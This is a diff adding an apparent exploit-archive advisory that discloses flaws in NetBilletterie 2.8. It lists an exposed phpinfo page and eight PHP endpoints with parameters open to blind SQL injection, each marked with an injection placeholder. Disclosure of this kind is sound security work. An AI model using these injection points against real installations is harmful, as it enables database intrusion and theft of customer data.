@@ -1,0 +1,31 @@
+# Exploit Title: NetBilletterie 2.8 | Multiple Vulnerabilities
+# Date: 14/07/16
+# Exploit Author: Wadeek
+# Website Author: https://github.com/Wad-Deek
+# Vendor Homepage: http://net-billetterie.tuxfamily.org/
+# Software Link: https://sourceforge.net/projects/netbilletterie/files/
+# Demo Link: http://net-billetterie.tuxfamily.org/NetBilletterieDemo/login.inc.php
+# Version: 2.8
+# Tested on: Xampp on Windows7
+# Fuzzing tool: https://github.com/Trouiller-David/PHP-Source-Code-Analysis-Tools
+
+[phpinfo()]
+################################################################
+(200) => http://localhost/netbilletterie/php_info.php
+################################################################
+
+[6 SQL Injection (Type: time-based blind)]
+################################################################
+(200) => http://localhost/netbilletterie/lister_detail_bon.php?date_debut=*
+(200) => http://localhost/netbilletterie/lister_pointes_ok.php?date_debut=*
+(302) => http://localhost/netbilletterie/delete_article.php?article=*
+(302) => http://localhost/netbilletterie/delete_banque.php?id_banque=*
+(302) => http://localhost/netbilletterie/delete_tarif.php?id_tarif=*
+(302) => http://localhost/netbilletterie/del_client.php?num=*
+################################################################
+
+[2 SQL Injection (Type: boolean-based blind)]
+################################################################
+(200) => http://localhost/netbilletterie/fpdf/liste_spectateurs.php?article=*
+(200) => http://localhost/netbilletterie/fpdf/liste_spectateurs_attente.php?article=*
+################################################################
